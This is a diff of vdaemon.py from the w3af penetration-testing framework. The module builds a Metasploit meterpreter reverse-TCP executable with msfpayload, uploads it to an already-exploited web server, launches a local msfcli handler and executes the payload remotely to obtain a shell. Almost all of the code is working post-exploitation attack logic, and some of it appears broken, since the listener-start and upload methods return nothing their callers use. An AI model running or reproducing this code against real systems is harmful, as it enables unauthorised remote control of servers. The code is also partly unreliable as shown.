@@ -1,7 +1,7 @@
 '''
 vdaemon.py
 
-Copyright 2006 Andres Riancho
+Copyright 2010 Andres Riancho
 
 This file is part of w3af, w3af.sourceforge.net .
 
@@ -20,205 +20,177 @@ Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 
 '''
 
-import sys
-import socket
-from core.controllers.threads.w3afThread import w3afThread
-import core.controllers.outputManager as om
-from core.controllers.w3afException import *
-import re
-import traceback
+import core.data.kb.config as cf
+import core.data.parsers.urlParser as urlParser
 
-class vdaemon(w3afThread):
+import core.controllers.outputManager as om
+from core.controllers.w3afException import w3afException
+from core.controllers.payloadTransfer.payloadTransferFactory import payloadTransferFactory
+from core.controllers.intrusionTools.execMethodHelpers import getRemoteTempFile
+
+import os
+import tempfile
+import random
+import subprocess
+
+
+class vdaemon(object):
     '''
-    This class represents a virtual daemon, a point of entry for metasploit plugins to exploit. This class should be
-    subclassed into winVd and lnxVd, each implementing a different way of sending the metasploit shellcode
-    to the remote web server.
+    This class represents a virtual daemon that will run metasploit's msfpayload, create an
+    executable file, upload it to the remote server, run the payload handler locally and
+    finally execute the payload in the remote server. 
+    
+    This class should be sub-classed by winVd and lnxVd, each implementing a different way
+    of sending the metasploit shellcode to the remote web server.
     
     @author: Andres Riancho ( andres.riancho@gmail.com )
     '''
-    def __init__( self, execMethod ):
-        # I'm a thread!
-        w3afThread.__init__(self)
+    def __init__( self, exec_method ):        
         
         # This is the method that will be used to send the metasploit shellcode to the 
         # remote webserver ( using echo $payload > file )
-        self._execMethod = execMethod
-            
-        self._running = False
-        self._go = False
-        self._ipAddress = ''
-        self._localport = 9091
+        self._exec_method = exec_method
         
-    def setListenPort( self, port ):
-        self._localport = port
-    
-    def stop(self):
-        om.out.debug('Calling stop of virtual daemon.')
-        if self._running:
-            self._go = False
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            try:
-                s.connect(('localhost', self._localport))
-                s.close()
-            except:
-                pass
-            self._running = False
-            
-    def run(self):
+        self._metasploit_location = cf.cf.getData('msf_location')
+        self._msfpayload_path = os.path.join( self._metasploit_location , 'msfpayload' )
+        self._msfcli_path = os.path.join( self._metasploit_location , 'msfcli' )
+        
+                                
+    def run(self, user_defined_parameters):
         '''
-        This is the main loop.
+        This is the entry point. We get here when the user runs the "payload vdaemon linux/x86/meterpreter/reverse_tcp"
+        command in his w3af shell after exploiting a vulnerability.
+        
+        @param user_defined_parameters: The parameters defined by the user, for example, the type of payload to send.
+        @return: True if we succeded.
         '''
-        self._running = True
-        self._go = True
-
-        serversocket = socket.socket( socket.AF_INET, socket.SOCK_STREAM)
+        
+        #
+        #    We follow the same order as MSF, but we only allow the user to generate executable files
+        #    If the user tries to create a payload for a wrong OS, we'll warn but allow it.
+        #
+        #    Usage: /opt/metasploit3/msf3/msfpayload <payload> [var=val]
+        #
+        payload = user_defined_parameters[0]
+        parameters = user_defined_parameters[1:]
+        
         try:
-            serversocket.bind((socket.gethostname(), self._localport))
-        except:
-            raise w3afException('Vdaemon failed to bind to port: ' + str(self._localport) )
-        else:
-            om.out.information('Virtual daemon service is running on port '+str(self._localport)+', use metasploit\'s w3af_vdaemon module to exploit it. ')
-        serversocket.listen(5)
+            executable_file_name = self._generate_exe( payload, parameters )
+        except Exception, e:
+            raise w3afException( 'Failed to create the payload file, error: "%s".' % str(e) )
         
-        while self._go:
-            #accept connections
-            try:
-                (clientsocket, address) = serversocket.accept()
-            except KeyboardInterrupt, k:
-                self.stop()
-            except socket.timeout:
-                pass
-            except Exception, e:
-                raise e
+        try:
+            remote_file_location = self._send_exe_to_server( executable_file_name )
+        except Exception, e:
+            raise w3afException( 'Failed to send the payload file, error: "%s".' % str(e) )
+        else:
+            om.out.console('Successfully transfered the MSF payload to the remote server.')
+            
+            #
+            #    Good, the file is there, now we launch the local listener and then we execute
+            #    the remote payload
+            #
+            LHOST = 'LHOST=%s' % cf.cf.getData('localAddress')
+            
+            domain = urlParser.getDomain(cf.cf.getData('targets')[0])
+            RHOST = 'RHOST=%s' % domain
+            
+            handler_parameters = [ LHOST, RHOST ]
+            
+            if not self._start_local_listener( payload, handler_parameters ):
+                om.out.console('Failed to start the local listener for "%s"' % payload)
             else:
                 try:
-                    om.out.console('')
-                    self._handleMetasploit( clientsocket, address )
-                except w3afException, w3:
-                    om.out.error('Error: ' + str(w3) )
-                except Exception, e:
-                    om.out.error('hmmm... unhandled exception in method:  _handleMetasploit() , details: ' + str(e) )
-                    om.out.debug( 'Traceback:\n' + str( traceback.format_exc() ) )
-    
-    def _dump( self, src, length=20 ):
-        '''
-        prints a hexString
-        '''
-        FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
-
-        N=0; result=''
-        while src:
-           s,src = src[:length],src[length:]
-           hexa = ' '.join(["%02X"%ord(x) for x in s])
-           s = s.translate(FILTER)
-           result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
-           N+=length
-           
-        return result
-        
-    def getIPAddress( self ):
-        if self._ipAddress == '':
-            raise w3afException('You must set an IP address to use the vdaemon.')
-        return self._ipAddress
-    
-    def setRemoteIP( self, ip ):
-        if not re.match('\d?\d?\d?\.\d?\d?\d?\.\d?\d?\d?\.\d?\d?\d?', ip ):
-            # It's a hostname, must resolve.
-            import socket
-            ip = socket.gethostbyname( ip )
-        self._ipAddress = ip
-        
-    def _handleMetasploit( self, clientsocket, address ):
-        '''
-        Handles a metasploit plugin sending the payload to the virtual server.
-        '''
-        # Save the variables so anyone can access them
-        self._clientsocket = clientsocket
-        self._address = address
-        
-        om.out.debug('Handling metasploit connection.')
-        
-        hello = '<metasploit-w3af-link>'
-        recv = clientsocket.recv( len('<metasploit-w3af-link>') )
-        if recv != hello:
-            clientsocket.close()
-        else:
-            # Send the remote IP address
-            self._sendToMSF( self.getIPAddress() )
-            
-            shellcodeLen = clientsocket.recv( 4 )
-            shellcodeLen = int( shellcodeLen )
-            om.out.debug('The shellcode is '+str(shellcodeLen)+' bytes long.')
-            
-            shellcode = clientsocket.recv( shellcodeLen )
-            om.out.debug('Received the following shellcode from metasploit:')
-            om.out.debug( self._dump(shellcode) )
-            
-            try:
-                executableFile = self._generateExe( shellcode )
-            except Exception, e:
-                raise w3afException( 'Failed to create the executable file, internal error: ' + str(e) )
-                clientsocket.close()
-                return
-            
-            try:
-                self._sendExeToServer( executableFile )
-            except Exception, e:
-                raise w3afException( 'Failed to send the executable file to the server, error: ' + str(e) )
-            else:
-                om.out.information('Successfully transfered the MSF payload to the remote server.')
-                
-                # Good, the file is there, now execute it!
-                try:
-                    self._execShellcode()
+                    self._exec_payload( remote_file_location )
                 except Exception, e:
                     raise w3afException('Failed to execute the executable file on the server, error: ' + str(e) )
                 else:
-                    om.out.information('Successfully executed the MSF payload on the remote server.')
-                    #self._sendToMSF('Success!' )
-                    clientsocket.close()
-                    
-    def _sendToMSF( self, msg ):
-        om.out.debug('[vdaemon] Sending: "' + msg + '" to MSF.')
-        try:
-            self._clientsocket.send( msg )
-        except:
-            raise w3afException('Failed to send data to metasploit.')
-            
-    def _generateExe( self, shellcode ):
+                    om.out.console('Successfully executed the MSF payload on the remote server.')
+    
+    def _start_local_listener(self, payload, parameters ):
+        '''
+        Runs something similar to:
+        
+        ./msfcli exploit/multi/handler PAYLOAD=windows/shell/reverse_tcp LHOST=192.168.1.112 E
+        
+        In a new console.
+        
+        @return: True if it was possible to start the listener in a new console
+        '''
+        msfcli_command = '%s exploit/multi/handler PAYLOAD=%s %s E' % (self._msfcli_path, payload, ' '.join(parameters) )
+        subprocess.Popen( ['gnome-terminal', '-e', msfcli_command] )
+    
+    def _generate_exe( self, payload, parameters ):
         '''
         This method should be implemented according to the remote operating system. The idea here
         is to generate an ELF/PE file and return a string that represents it.
+
+        The method will basically run something like:
+        msfpayload linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8443 X > /tmp/output2.exe
         
-        This method should be implemented in winVd and lnxVd.
+        @param payload: The payload to generate (linux/x86/meterpreter/reverse_tcp)
+        @param parameters: A list with the parameters to send to msfpayload ['LHOST=1.2.3.4', 'LPORT=8443']
+        
+        @return: The name of the generated file, in the example above: "/tmp/output2.exe"
         '''
-        raise w3afException('Please implement the _generateExe method.')
+        temp_dir = tempfile.gettempdir()
+        randomness = str( random.randint(0,293829839) )
+        output_filename = os.path.join(temp_dir, 'msf-' + randomness + '.exe')
         
-    def _sendExeToServer( self, exeFile ):
+        command = '%s %s %s X > %s' % (self._msfpayload_path, payload, ' '.join(parameters), output_filename)
+        os.system( command )
+        
+        if os.path.isfile( output_filename ):
+            return output_filename
+        else:
+            raise w3afException('Something failed while creating the payload file.')
+        
+    def _send_exe_to_server( self, exe_file ):
         '''
         This method should be implemented according to the remote operating system. The idea here is to
-        send the exeFile to the remote server and save it in a file.
+        send the exe_file to the remote server and save it in a file.
         
-        This method should be implemented in winVd and lnxVd.
+        @param exe_file: The local path to the executable file
+        @return: The name of the remote file that was uploaded.
         '''
-        raise w3afException('Please implement the _sendExeToServer method.')
+        om.out.debug('Called _send_exe_to_server()')
+        om.out.console('Please wait while w3af uploads the payload to the remote server.')
         
-    def _execShellcode( self ):
+        ptf = payloadTransferFactory( self._exec_method )
+        
+        # Now we get the transfer handler
+        wait_time_for_extrusion_scan = ptf.estimateTransferTime()
+        transferHandler = ptf.getTransferHandler()
+        
+        if not transferHandler.canTransfer():
+            raise w3afException('Can\'t transfer the file to remote host, canTransfer() returned False.')
+        else:
+            om.out.debug('The transferHandler can upload files to the remote end.')
+
+            estimatedTime = transferHandler.estimateTransferTime( len(exe_file) )
+            om.out.debug('The payload transfer will take "' + str(estimatedTime) + '" seconds.')
+            
+            self._remote_filename = getRemoteTempFile( self._exec_method )
+            om.out.debug('Starting payload upload, remote filename is: "' + self._remote_filename + '".')
+            transferHandler.transfer( exe_file, self._remote_filename )
+        
+        om.out.console('Finished payload upload.')
+        
+    def _exec_payload( self, remote_file_location ):
         '''
         This method should be implemented according to the remote operating system. The idea here is to
-        execute the payload that was sent using _sendExeToServer and generated by _generateExe . In lnxVd
+        execute the payload that was sent using _send_exe_to_server and generated by _generate_exe . In lnxVd
         I should run "chmod +x file; ./file"
         
         This method should be implemented in winVd and lnxVd.
         '''
-        raise w3afException('Please implement the _execShellcode method.')
+        raise w3afException('Please implement the _exec_payload method.')
 
     def _exec( self, command ):
         '''
         A wrapper for executing commands
         '''
         om.out.debug('Executing: ' + command )
-        response = apply( self._execMethod, ( command ,))
+        response = apply( self._exec_method, ( command ,))
         om.out.debug('"' + command + '" returned: ' + response )
         return response
